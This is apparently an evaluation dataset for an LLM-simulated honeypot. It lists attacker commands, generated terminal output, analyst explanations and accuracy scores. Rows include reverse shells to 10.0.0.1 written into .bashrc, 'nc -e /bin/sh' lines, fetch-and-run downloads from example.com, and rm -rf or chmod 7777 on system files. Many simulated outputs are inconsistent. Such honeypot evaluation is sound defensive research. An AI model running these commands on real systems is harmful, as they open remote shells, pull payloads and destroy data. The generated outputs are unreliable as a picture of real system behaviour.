@@ -1,0 +1,243 @@
+Architecture,Session_ID,Tactic,Turn,Command,Terminal_Output,Analyst_Explanation,Accuracy,Groundedness
+baseline,BAS-001-970B52,Reconnaissance,8,`ls -al /home/user1`,"total 4
+-rw-r--r-- 1 user1 user1 0 Apr 15 12:34 .bash_logout
+-rw-r--r-- 1 user1 user1 0 Apr 15 12:34 .bash_profile
+-rw-r--r-- 1 user1 user1 0 Apr 15 12:34 .bashrc",The attacker is attempting to enumerate files and directories within the target's home directory.,5,5
+baseline,BAS-008-7B8B87,Credential Access,23,"`sudo /usr/bin/ssh-keygen -t rsa -N """" -f ~/.ssh/id_rsa`","Generating public/private rsa key pair.
+Your identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:abcdef1234567890abcdef1234567890abcdef root@localhost
+The key's randomart image is:
++---[RSA 3072]----+
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
++----[SHA256]-----+",Attacker likely attempting to generate a SSH key pair for potential remote access.,5,5
+baseline,BAS-012-4C0BDD,Command and Control,11,"`bash -c ""nc 10.0.0.1 443 < /etc/hosts""`",,The attacker is attempting to enumerate hosts and potentially establish a connection to a target server.,3,4
+baseline,BAS-007-0BCE4E,Defense Evasion,14,`whoami`,www-data,The attacker is attempting to determine their own username.,5,5
+baseline,BAS-023-5FA503,Discovery,8,"`bash -c ""whoami > /tmp/user.txt""`",,The attacker is attempting to identify their own username by running a command that outputs it to a file.,5,5
+baseline,BAS-023-5FA503,Discovery,15,`rm -rf /tmp/loplibin.txt`,,"The attacker is attempting to delete a file in the `/tmp` directory, likely for data exfiltration or system disruption.",3,5
+baseline,BAS-005-E19854,Persistence,9,`sudo chmod 7777 /bin/bash && cp /bin/bash /root/backdoor.sh`,"chmod: cannot access '/bin/bash': Permission denied
+/bin/sh: cp: cannot stat '/bin/bash': No such file or directory",The attacker is attempting to gain root privileges and execute a backdoor script.,3,4
+baseline,BAS-026-CDBBFA,Command and Control,14,"`echo '<script>bash -i &>/dev/tcp/10.0.0.1/8080 0>&1'</script>"" > /var/spool/mail/root`",-bash: /var/spool/mail/root: Permission denied,The attacker attempted to execute a malicious script that would allow them to gain root access and potentially execute further commands.,3,4
+baseline,BAS-010-AAF00D,Lateral Movement,21,`ls /dev/null >> /etc/hosts`,,"The attacker is attempting to modify the `/etc/hosts` file, which could be used for DNS manipulation or service redirection.",4,5
+baseline,BAS-010-AAF00D,Lateral Movement,17,`/usr/bin/find / -type f -exec cat {} \; | grep -o 'privileged' | xargs /bin/bash >> /tmp/output.txt`,,The attacker is attempting to enumerate privileged files and potentially gain access to sensitive information.,3,5
+baseline,BAS-006-FE65D1,Privilege Escalation,6,rm -rf /root/.bash_history /root/.bashrc /root/.bash_profile,,"The attacker is attempting to delete critical system configuration files, likely aiming to disrupt or compromise the honeypot environment.",4,5
+baseline,BAS-015-0323C1,Reconnaissance,19,lsb_release -a,"No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 22.04.1 LTS
+Release:        22.04
+Codename:       jammy","Attacker is attempting to gather system information, specifically the distribution and release details.",5,5
+baseline,BAS-027-31695B,Exfiltration,9,"`/bin/bash -c ""curl http://example.com/exfiltration_tool.tgz > /tmp/tool.tar.gz""`","--2023-04-15 12:34:56--  http://example.com/exfiltration_tool.tgz
+Resolving example.com (example.com)... 93.184.216.34, 2606:2800:220:1:248:1893:25c8:1946
+Connecting to example.com (example.com)|93.184.216.34|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [application/x-gzip]
+Saving to: '/tmp/tool.tar.gz'
+
+     0           0 --.-K/s   in 0s      
+
+2023-04-15 12:34:56 (inf/bps) - Download complete","The attacker is attempting to download a tar.gz file from a remote server, likely for exfiltration of data.",4,5
+baseline,BAS-002-59DDBE,Resource Development,19,"`/bin/bash -c 'sudo rm -rf /tmp/lolbin.txt && sudo echo ""LOLBIN TEST"" > /root/loolbin.txt'`","/bin/bash: cannot remove '/tmp/lolbin.txt': Permission denied
+/bin/bash: cannot touch '/root/loolbin.txt': Permission denied","Attacker attempted to delete a file and overwrite another, likely attempting to gain access to critical system files.",3,4
+baseline,BAS-011-AD4945,Collection,12,`which netstat`,/usr/bin/netstat,The attacker is attempting to identify network tools and services on the honeypot.,3,5
+baseline,BAS-007-0BCE4E,Defense Evasion,19,`cat /dev/null > /root/.bashrc`,,"The attacker is attempting to modify a critical system file, potentially to gain root access or execute malicious commands.",3,5
+baseline,BAS-002-59DDBE,Resource Development,2,`/bin/bash -c 'ls -l /proc/*/fd | grep tmpfs'`,"/proc/1234/fd -> /dev/null
+/proc/5678/fd -> /tmpfs",The attacker is attempting to enumerate system files and identify potential targets for further exploitation.,3,5
+baseline,BAS-027-31695B,Exfiltration,25,"`/bin/bash -c ""rm -rf /tmp/exfil.log""`",,"The attacker is attempting to delete a log file, likely for exfiltration of data.",4,5
+baseline,BAS-003-F0F47B,Initial Access,25,`ls -la ~`,"-rw-r--r-- 1 dummyuser dummyuser 0 Jan  1 00:00 /home/dummyuser/.bash_logout
+-rw-r--r-- 1 dummyuser dummyuser 0 Jan  1 00:00 /home/dummyuser/.bashrc
+-rw-r--r-- 1 dummyuser dummyuser 0 Jan  1 00:00 /home/dummyuser/.profile
+-rw-r--r-- 1 dummyuser dummyuser 0 Jan  1 00:00 /home/dummyuser/.ssh/authorized_keys",The attacker is attempting to enumerate files and directories within the honeypot user's home directory.,5,5
+baseline,BAS-007-0BCE4E,Defense Evasion,16,`nc 10.0.2.15 1234 -e /bin/sh`,nc: connect to 10.0.2.15 port 1234 (tcp) failed: Connection refused,The attacker is attempting to gain unauthorized access to a remote system by exploiting a network connection vulnerability.,2,3
+baseline,BAS-028-69C891,Impact,2,`rm -rf /tmp/*`,,"The attacker is attempting to delete all files in the `/tmp` directory, which could be used for data exfiltration or denial-of-service attacks.",4,5
+baseline,BAS-005-E19854,Persistence,22,`sudo cp -p /bin/sh /usr/local/bin/backdoor`,,"The attacker is attempting to copy a shell script (likely containing malicious code) to a location on the honeypot system, potentially for later execution.",4,5
+baseline,BAS-023-5FA503,Discovery,13,"`/bin/bash -c ""ls""`",Desktop  Documents  Downloads  Music  Pictures,The attacker is attempting to list files in the honeypot's directory structure.,5,5
+baseline,BAS-019-57585B,Persistence,16,`sudo wget http://example.com/lolbin.sh -O /tmp/lolbin.sh && chmod +x /tmp/lolbin.sh && sudo ./tmp/lolbin.sh`,"wget: unable to resolve host address 'example.com'
+chmod: cannot access '/tmp/lolbin.sh': No such file or directory
+cannot execute './tmp/lolbin.sh': No such file or directory",The attacker is attempting to download and execute a shell script from a known malicious source (example.com). This is likely part of a reconnaissance phase to identify potential targets.,3,4
+baseline,BAS-011-AD4945,Collection,4,"`echo ""Hello World"" > /tmp/helloworld.txt`",,"The attacker is attempting to create a file named 'helloworld.txt' in the `/tmp` directory, which could be used for further actions like data exfiltration or persistence.",4,5
+baseline,BAS-027-31695B,Exfiltration,21,`wget http://example.com/lolbin.sh && chmod +x lolbin.sh && ./lolbin.sh > /dev/null 2>&1`,,Attacker is attempting to download and execute a shell script likely designed for lateral movement or privilege escalation.,4,5
+baseline,BAS-001-970B52,Reconnaissance,15,`sudo ls -l /home/user2/.ssh/id_rsa`,-rw------- 1 user2 user2 1766 Apr 15 12:34 /home/user2/.ssh/id_rsa,The attacker is attempting to enumerate authorized SSH keys on a honeypot system.,3,5
+baseline,BAS-004-912D84,Execution,9,"`bash -c ""echo 'setuid' > /tmp/sudoers""`",,The attacker is attempting to gain root privileges by modifying the sudoers file.,4,5
+baseline,BAS-001-970B52,Reconnaissance,22,`ls -lR /`,"/:
+
+drwxr-xr-x 2 root root 4096 Apr 15 12:34 bin
+-rw-r--r-- 1 root root 0 Apr 15 12:34 boot
+...",Attacker is attempting to list directory contents and file permissions.,5,5
+baseline,BAS-007-0BCE4E,Defense Evasion,10,"`bash -c ""exec 5<>/dev/tcp/127.0.0.1/8080; bash""`",/bin/bash: cannot open /dev/tcp/127.0.0.1/8080: Connection refused,"The attacker is attempting to establish a TCP connection to port 8080 on the honeypot's local machine, likely for further exploitation.",4,4
+baseline,BAS-028-69C891,Impact,7,"`/bin/bash -c ""echo 'LOLBIN TEST' > /tmp/test.txt""`",,The attacker is attempting to create a file named test.txt in the `/tmp` directory containing a message that could be used for reconnaissance or further exploitation.,4,5
+baseline,BAS-002-59DDBE,Resource Development,22,`/bin/bash -c 'sudo cp /tmp/lolbin /root/.lolbin && sudo chown root.root /root/.lolbin'`,/bin/bash: cannot create /root/.lolbin: Permission denied,"The attacker attempted to copy a file from `/tmp/lolbin` to `/root/.lolbin`, which is likely intended to gain access to sensitive data or execute malicious code.",3,4
+baseline,BAS-018-D19D4A,Execution,5,`/bin/sh -c 'echo $(id)'`,"uid=1000(user) gid=1000(group) groups=1000(group),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)","Attacker is attempting to gather system information, specifically user ID and group membership.",5,5
+baseline,BAS-016-6CDC7A,Resource Development,21,`which python3`,/usr/bin/python3,The attacker is attempting to determine the location of the Python 3 executable.,5,5
+baseline,BAS-010-AAF00D,Lateral Movement,9,"`/bin/bash -c ""ls -l""`","-rw-r--r-- 1 fakeuser fakeuser 0 Jan 1 1970 /home/fakeuser/file1.txt
+-rw-r--r-- 1 fakeuser fakeuser 0 Jan 1 1970 /home/fakeuser/file2.txt",Attacker is attempting to list files in the honeypot's directory.,5,5
+baseline,BAS-023-5FA503,Discovery,17,`ls -alR /dev`,"/dev:
+
+total 0
+
+dev/
+
+total 0",The attacker is attempting to enumerate system devices and potentially identify critical components.,3,5
+baseline,BAS-002-59DDBE,Resource Development,5,`ls -l /tmp`,"-rw-r--r-- 1 user group 0 Jan 1 00:00 lolbin.txt
+-rwxr-xr-x 1 user group 1234 Jan 1 00:00 lolbin","The attacker is attempting to list files in the `/tmp` directory, which could be used for reconnaissance or potential file manipulation.",4,5
+baseline,BAS-015-0323C1,Reconnaissance,21,grep PermitRootLogin /etc/ssh/sshd_config,PermitRootLogin no,The attacker is attempting to determine if root login is disabled in the SSH configuration.,5,5
+baseline,BAS-011-AD4945,Collection,1,`sudo /bin/bash`,"Sorry, try again.
+Sorry, try again.
+Sorry, try again.
+root@ubuntu-server:~#",The attacker is attempting to gain root access by executing a command that allows them to run a shell as root.,2,3
+baseline,BAS-003-F0F47B,Initial Access,8,"`bash -c ""echo '/dev/urandom > /etc/passwd'""`",/bin/bash: cannot create /etc/passwd: Permission denied,"The attacker attempted to overwrite the `/etc/passwd` file, which is a critical system file that contains user account information. This action could potentially allow for privilege escalation or unauthorized access.",5,5
+baseline,BAS-001-970B52,Reconnaissance,3,`ls -lR /root/.ssh`,"/root/.ssh:
+
+drwx------ 2 root root 4096 Apr 15 12:34 authorized_keys
+-rw------- 1 root root 1766 Apr 15 12:34 id_rsa
+-rw-r--r-- 1 root root 4096 Apr 15 12:34 id_rsa.pub
+-rw-r--r-- 1 root root 11 Apr 15 12:34 known_hosts",The attacker is attempting to enumerate authorized keys and potentially gain access to sensitive information.,3,5
+baseline,BAS-011-AD4945,Collection,20,"`ssh user@target_host ""mkdir /tmp/testdirectory""`",,"The attacker is attempting to create a directory on the honeypot server, likely for further malicious activity.",3,5
+baseline,BAS-016-6CDC7A,Resource Development,6,"`python3 -c 'import hashlib; print(hashlib.sha256(""root"").hexdigest())' >> /tmp/passlist.txt`",,Attacker is attempting to enumerate potential usernames and passwords by using a Python script to calculate the SHA256 hash of 'root' and storing it in a file.,2,3
+baseline,BAS-017-3916A0,Initial Access,23,`smbclient -U root //localhost/C$`,"Enter root's password: NT_STATUS_ACCESS_DENIED
+Access denied.",The attacker is attempting to gain unauthorized access to a Windows share by using SMB client to connect to a specific path.,4,5
+baseline,BAS-028-69C891,Impact,16,`nc -lvp 1337 > /var/log/payload.log`,,The attacker is attempting to establish a listening port on localhost (1337) and redirecting log output to a file.,4,5
+baseline,BAS-013-D88120,Exfiltration,22,`bash -c 'cp /bin/bash /dev/shm/ && chmod +x /dev/shm/bash'`,-bash: cp: cannot create regular file '/dev/shm/bash': Permission denied,"The attacker attempted to copy the /bin/bash executable to the /dev/shm directory, likely to gain root access or execute malicious code.",3,4
+baseline,BAS-026-CDBBFA,Command and Control,8,"`echo ""bash -i &>/dev/tcp/10.0.0.1/8080 0>&1"" > /tmp/bash.sh && chmod +x /tmp/bash.sh && /tmp/bash.sh &`",/bin/bash: /tmp/bash.sh: Permission denied,"The attacker attempted to execute a shell script that would spawn a reverse shell on port 8080, likely for further interaction.",5,4
+baseline,BAS-013-D88120,Exfiltration,23,"`bash -c 'echo ""I am root"" > /tmp/exfil.txt && chmod 777 /tmp/exfil.txt'`",-bash: /bin/bash: Permission denied,"The attacker attempted to execute a command that would create a file and grant it write permissions, likely for exfiltration of data.",3,4
+baseline,BAS-008-7B8B87,Credential Access,10,`whoami`,root,The attacker is attempting to determine their own username.,5,5
+baseline,BAS-008-7B8B87,Credential Access,17,"`ssh-keygen -t rsa -N """" -f ~/.ssh/id_rsa`","Generating public/private rsa key pair.
+Your identification has been saved in /root/.ssh/id_rsa.
+Your public key has been saved in /root/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:abcdef1234567890abcdef1234567890abcdef root@localhost
+The key's randomart image is:
++---[RSA 3072]----+
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
+|                 |
++----[SHA256]-----+",Attacker is attempting to generate a public/private SSH key pair for potential use in unauthorized access.,5,5
+baseline,BAS-020-E1C199,Privilege Escalation,16,"`python3 -c 'import os; os.system(""pip3 install --user python3-setuptools"")'""","Collecting setuptools
+  Downloading https://files.pythonhosted.org/packages/5f/bb/f8c3a2e6d40971ec685665e66e34f86b888bd86538fa7a8ac61a0f7679ae/setuptools-58.0.4-py3-none-any.whl (82 kB)
+     |████████████████████████████████| 82 kB 4.2 MB/s 
+Installing collected packages: setuptools
+Successfully installed setuptools-58.0.4",Attacker is attempting to install a package (setuptools) on the honeypot system to gain access to additional tools and functionalities.,4,5
+baseline,BAS-026-CDBBFA,Command and Control,19,"`sudo bash -c ""echo '<script>bash -i &>/dev/tcp/10.0.0.1/8080 0>&1'</script>"" >> /root/.bashrc`",,The attacker is attempting to execute a command that will create a reverse shell and establish a connection to a remote server.,5,5
+baseline,BAS-015-0323C1,Reconnaissance,23,ls -la ~,"-rw-r--r-- 1 debian-user debian-user 0 Jan  1 00:00 .bash_logout
+-rw-r--r-- 1 debian-user debian-user 3771 Jan  1 00:00 .bashrc
+-rw-r--r-- 1 debian-user debian-user 807 Jan  1 00:00 .profile",Attacker is attempting to enumerate files and directories within the honeypot user's home directory.,5,5
+baseline,BAS-009-0B9AE8,Discovery,5,`ls /var/www/html`,index.html  style.css  script.js,"The attacker is attempting to list files within a web server directory, likely to gather information about potential targets.",4,5
+baseline,BAS-009-0B9AE8,Discovery,8,`ls /proc/self/environ | grep -oE 'USER=[^ ]*'`,USER=root,The attacker is attempting to identify the username of the honeypot system.,3,5
+baseline,BAS-020-E1C199,Privilege Escalation,5,"`sudo apt-get install -y curl && echo ""CURL INSTALLED""`","E: dpkg was interrupted, you must manually run 'sudo dpkg --configure -a' to correct the problem before proceeding.
+
+The following packages have unmet dependencies:
+curl : Depends: libcurl4 (>= 7.68.0) but it is not installable
+
+E: Unable to correct problems, you have held broken packages.",The attacker attempted to install the curl package and encountered an unmet dependency error.,5,5
+baseline,BAS-023-5FA503,Discovery,21,`echo $SHELL`,/bin/bash,The attacker is attempting to determine their current shell environment.,5,5
+baseline,BAS-027-31695B,Exfiltration,23,`wget http://example.com/exfiltration_tool.tgz && tar xvf /tmp/exfiltration_tool.tgz -C /usr/local/bin/ --strip-components=1`,"--2023-04-15 12:34:56--  http://example.com/exfiltration_tool.tgz
+Resolving example.com (example.com)... 93.184.216.34, 2606:2800:220:1:248:1893:25c8:1946
+Connecting to example.com (example.com)|93.184.216.34|:80... connected.
+HTTP request sent, awaiting response... 404 Not Found
+2023-04-15 12:34:56 ERROR 404: Not Found.
+tar xvf /tmp/exfiltration_tool.tgz -C /usr/local/bin/ --strip-components=1
+tar: /tmp/exfiltration_tool.tgz: Cannot open: No such file or directory","The attacker is attempting to download and execute a tar archive containing an exfiltration tool, likely for data theft.",3,4
+baseline,BAS-005-E19854,Persistence,10,"`sudo echo ""exec /root/backdoor.sh > /dev/null 2>&1"" >> ~/.bashrc`",,"Attacker is attempting to execute a backdoor script, likely for remote access or further malicious activity.",4,5
+baseline,BAS-018-D19D4A,Execution,18,"`/bin/bash -c 'echo ""LOLBIN: Bash executed as root"" >> /var/log/syslog'`",,The attacker is attempting to gain access to a system by executing commands as root.,3,5
+baseline,BAS-018-D19D4A,Execution,7,`/bin/bash -c 'ls /'`,bin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var,Attacker is attempting to list directory contents on the honeypot system.,5,5
+baseline,BAS-028-69C891,Impact,21,`ls /etc/passwd`,"root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+debianadm:x:100:65534:System Administrator,,,:/home/debianadm:/bin/bash",Attacker is attempting to enumerate system users and their privileges.,5,5
+baseline,BAS-024-73944C,Lateral Movement,10,`ls -l /home/user1`,"-rw-r--r-- 1 user1 user1 0 Jan  1 00:00 .bash_logout
+-rw-r--r-- 1 user1 user1 377 Jan  1 00:00 .bashrc
+-rw-r--r-- 1 user1 user1 807 Jan  1 00:00 .profile",The attacker is attempting to enumerate files and directory contents within the `/home/user1` directory.,5,5
+baseline,BAS-002-59DDBE,Resource Development,16,`/usr/sbin/useradd lolbin && sudo usermod -aG lolbin $(whoami)`,useradd: cannot lock /etc/passwd; try again later.,"The attacker is attempting to create a new user account named 'lolbin' and add it to the sudoers group, likely for privilege escalation.",4,3
+baseline,BAS-005-E19854,Persistence,25,`sudo chmod 7777 /bin/bash`,chmod: changing permissions of '/bin/bash': Operation not permitted,"The attacker attempted to gain elevated privileges by modifying the permissions of the `/bin/bash` file, which is a critical system file. This action could be used to execute malicious commands or escalate privileges.",4,5
+baseline,BAS-015-0323C1,Reconnaissance,7,whoami,debian-user,The attacker is attempting to determine their own username.,5,5
+baseline,BAS-019-57585B,Persistence,14,`wget http://example.com/lolbin.sh -O /tmp/lolbin.sh && chmod +x /tmp/lolbin.sh && sudo ./tmp/lolbin.sh`,"wget: unable to resolve host address 'example.com'
+chmod: cannot access '/tmp/lolbin.sh': No such file or directory
+cannot execute './tmp/lolbin.sh': No such file or directory","The attacker is attempting to download and execute a shell script from a known malicious URL, likely for lateral movement and privilege escalation.",3,4
+baseline,BAS-007-0BCE4E,Defense Evasion,25,`nc 127.0.0.1 8080 -e /bin/sh`,nc: connect to 127.0.0.1 port 8080 (tcp) failed: Connection refused,Attacker attempted to gain access to a remote service by exploiting a vulnerability or using a known exploit.,2,3
+baseline,BAS-027-31695B,Exfiltration,5,"`ls -lR | grep tar && echo ""Extraction failed""`",,"The attacker is attempting to identify and potentially exploit vulnerabilities in the honeypot's file system by listing directory contents, filtering for tar files, and then echoing a failure message.",3,2
+baseline,BAS-013-D88120,Exfiltration,7,`bash -c 'cp /dev/shm/.* /tmp/'`,-bash: cp: cannot create regular file '/tmp/.': Permission denied,"The attacker is attempting to copy files from the `/dev/shm` directory to the `/tmp` directory, which may be used for data exfiltration or persistence.",4,5
+baseline,BAS-016-6CDC7A,Resource Development,18,`which python3`,/usr/bin/python3,The attacker is attempting to determine the location of the Python 3 executable.,5,5
+baseline,BAS-003-F0F47B,Initial Access,23,`rm -rf /tmp/flag.txt`,,"The attacker is attempting to delete a file named 'flag.txt' from the honeypot's `/tmp` directory, likely to gain access to sensitive data or disrupt operations.",4,5
+baseline,BAS-011-AD4945,Collection,22,"`ssh user@target_host ""chmod +x /tmp/testfile""`",,"The attacker is attempting to execute a file on the honeypot, potentially for privilege escalation or further malicious activity.",3,4
+baseline,BAS-013-D88120,Exfiltration,12,`bash -c 'mkdir /dev/shm/exfil && mv /bin/bash /dev/shm/exfil/'`,"-bash: mkdir: cannot create directory '/dev/shm/exfil': Permission denied
+-bash: mv: cannot move '/bin/bash' to '/dev/shm/exfil/': Permission denied","The attacker is attempting to create a directory and place a file in it, likely for exfiltration of data.",3,5
+baseline,BAS-013-D88120,Exfiltration,2,`bash -c 'cp /dev/shm/.* /tmp/'`,,"The attacker is attempting to copy all files from the `/dev/shm` directory to the `/tmp` directory, potentially for data exfiltration or persistence.",4,5
+baseline,BAS-011-AD4945,Collection,8,"`ls -l | grep ""helloworld""`",-rw-r--r-- 1 root root    0 Jan  1  1970 /tmp/helloworld.txt,The attacker is attempting to enumerate files and identify potentially sensitive information.,3,5
+baseline,BAS-008-7B8B87,Credential Access,2,`ls /etc/passwd`,"root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+docker:x:1000:1000:Docker User,,,:/home/docker:/bin/false",The attacker is attempting to enumerate system users and their associated privileges.,5,5
+baseline,BAS-026-CDBBFA,Command and Control,9,"`bash -c ""echo '<script>bash -i &>/dev/tcp/10.0.0.1/8080 0>&1'</script>"" > /etc/bashrc`",-bash: /etc/bashrc: Permission denied,"The attacker attempted to execute a malicious script that would create a reverse shell, potentially allowing them to gain control of the honeypot.",4,4
+baseline,BAS-013-D88120,Exfiltration,11,`bash -c 'cp /bin/bash /root/ && chmod +x /root/bash'`,-bash: cp: cannot create regular file '/root/bash': Permission denied,The attacker is attempting to gain root access by copying the `/bin/bash` binary and then modifying its permissions.,3,4
+baseline,BAS-026-CDBBFA,Command and Control,18,"`echo '<script>bash -i &>/dev/tcp/10.0.0.1/8080 0>&1'</script>"" >> ~/.bashrc`",-bash: /home/user/.bashrc: Permission denied,The attacker is attempting to execute a malicious script that will run a reverse shell on the honeypot.,3,4
+baseline,BAS-025-BAACFD,Collection,8,`whoami`,fakeuser,The attacker is attempting to determine their own username.,5,5
+baseline,BAS-003-F0F47B,Initial Access,15,"`/usr/bin/env python -c 'import os; os.system(""nc 10.0.0.1 8080"")'`",,The attacker is attempting to execute a command that will attempt to connect to a remote server on port 8080.,5,5
+baseline,BAS-001-970B52,Reconnaissance,24,`cat /root/.ssh/id_rsa.pub >> /etc/hosts.equiv`,,"The attacker is attempting to obtain a copy of the public SSH key for potential use in later attacks, such as password cracking or credential theft.",3,5
+baseline,BAS-013-D88120,Exfiltration,20,`bash -c 'cp /dev/shm/exfil.sh /root/'`,-bash: cp: cannot create regular file '/root/exfil.sh': Permission denied,"The attacker is attempting to copy a shell script from the `/dev/shm` directory to the `/root` directory, likely to execute it as root.",4,5
+baseline,BAS-014-92D241,Impact,12,`sudo su`,"Sorry, try again.
+Sorry, try again.
+Sorry, try again.
+sudo: 3 incorrect password attempts",The attacker is attempting to gain root access by using `sudo su`. The honeypot's response indicates multiple failed attempts.,4,5
+baseline,BAS-015-0323C1,Reconnaissance,25,lsb_release -a,"No LSB modules are available.
+Distributor ID: Ubuntu
+Description:    Ubuntu 22.04.1 LTS
+Release:        22.04
+Codename:       jammy",The attacker is attempting to gather system information about the honeypot's distribution and release version.,5,5
+baseline,BAS-018-D19D4A,Execution,21,`/bin/sh -c '/usr/bin/bash -c whoami'`,root,The attacker is attempting to determine their own username by executing a command that runs `whoami` within a Bash shell.,5,5
+baseline,BAS-014-92D241,Impact,3,`which ls`,/bin/ls,The attacker is attempting to determine the location of system commands.,3,5
+baseline,BAS-026-CDBBFA,Command and Control,16,"`sudo echo '<script>bash -i &>/dev/tcp/10.0.0.1/8080 0>&1'</script>"" > ~/.bashrc`",-bash: /home/user/.bashrc: Permission denied,"The attacker is attempting to execute a malicious script via sudo, potentially for privilege escalation and further exploitation.",4,3
+baseline,BAS-017-3916A0,Initial Access,22,`smbclient -U root //localhost/C$`,"Enter root's password: 
+NT_STATUS_ACCESS_DENIED
+Access denied.","Attacker attempted to authenticate to a Windows SMB share using a known username and path, likely attempting to gain access to sensitive data.",4,5
+baseline,BAS-006-FE65D1,Privilege Escalation,5,id,"uid=1001(fakeuser) gid=1001(fakegroup) groups=1001(fakegroup),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)",Attacker is attempting to enumerate user IDs and group memberships.,4,5
+baseline,BAS-019-57585B,Persistence,3,`wget http://example.com/lolbin.sh && mv lolbin.sh /tmp`,"Connecting to example.com (93.184.216.34) port 80 ... connected.
+GET /lolbin.sh HTTP/1.1
+Host: example.com
+User-Agent: Wget/1.21.3 (linux-gnu)
+Accept-Encoding: identity
+Connection: close
+
+--2023-04-15 12:34:56--  http://example.com/lolbin.sh
+Resolving example.com (example.com)... 93.184.216.34, 2606:2800:220:1:248:1893:25c8:1946
+Connecting to example.com (example.com)|93.184.216.34|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified [application/x-sh]
+Saving to: 'lolbin.sh'
+
+     0K                                                       --.-K/s                
+2023-04-15 12:34:56 (0.00 B/s) - 'lolbin.sh' saved [1234/1234]
+
+mv: cannot move 'lolbin.sh' to '/tmp': Permission denied","The attacker is attempting to download and execute a shell script from a remote server, likely for malicious purposes.",3,5
+baseline,BAS-014-92D241,Impact,19,`php ~/Pictures/malicious_file.sh`,"#!/bin/bash
+
+echo 'Executing malicious script...'
+rm -rf /home/user/*
+
+# Script completed.","The attacker is attempting to execute a potentially malicious PHP script, which could be used for data exfiltration or system compromise.",3,4
+baseline,BAS-014-92D241,Impact,22,`bash ~/Pictures/malicious_file.sh`,"Executing malicious script...
+rm -rf /home/user/*",Attacker is attempting to execute a malicious shell script and delete all files in the user's home directory.,5,5
+baseline,BAS-013-D88120,Exfiltration,19,"`bash -c 'echo ""\x31\x6d\x3b \x73\x68 > /tmp/exfil.txt && chmod 777 /tmp/exfil.txt""'`",-bash: /bin/bash: Permission denied,"The attacker attempted to execute a command that would create a file and grant it write permissions, likely for exfiltration of data.",3,4
+baseline,BAS-009-0B9AE8,Discovery,1,`ls /dev/urandom && ls /proc`,"/dev/urandom: cannot open `/dev/urandom': No such file or directory
+/bin/cat: /proc: Is a directory
+/dev/null  /dev/random  /proc/asound  /proc/bus  /proc/cgroups  /proc/cpuinfo  /proc/diskstats  /proc/fb  /proc/filesystems  /proc/interrupts  /proc/ioports  /proc/kcore  /proc/keys  /proc/loadavg  /proc/meminfo  /proc/misc  /proc/modules  /proc/mounts  /proc/net  /proc/partitions  /proc/pid  /proc/scsi  /proc/self  /proc/sched_debug  /proc/stat  /proc/swaps  /proc/sys  /proc/sysrq-trigger  /proc/timer_list  /proc/uptime  /proc/version","The attacker is attempting to enumerate system files and directories, likely for reconnaissance purposes.",4,5
+baseline,BAS-024-73944C,Lateral Movement,3,`w`,"12:34:56 up 1 day, 0 min,  1 user,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+user1    pts/0    ::ffff:127.0.0.1   12:34    0.00s  0.00s  0.00s w",The attacker is attempting to execute a command to list files in the current directory.,1,5
+baseline,BAS-001-970B52,Reconnaissance,6,"`cat /etc/passwd | grep -v ""root""`","user1:x:1000:1000:User One,,,:/home/user1:/bin/bash
+user2:x:1001:1001:User Two,,,:/home/user2:/bin/bash",The attacker is attempting to enumerate user accounts on the honeypot by listing them and filtering out the root account.,5,5
+baseline,BAS-024-73944C,Lateral Movement,15,`ssh -o StrictHostKeyChecking=no root@localhost '/bin/bash'`,"root@localhost's password:
+Last login: Mon Jan  1 00:00:00 UTC 2022 from ::1
+root@ubuntu-server:~#",Attacker attempted to gain unauthorized access to a remote system by exploiting SSH and executing arbitrary commands.,3,5
+baseline,BAS-018-D19D4A,Execution,10,"`/bin/bash -c 'mv /home/user/.bash_logout /tmp; echo ""LOLBIN: Bash manipulated"" >> /var/log/syslog'`",,Attacker attempted to modify a critical system file and log activity for malicious purposes.,4,5
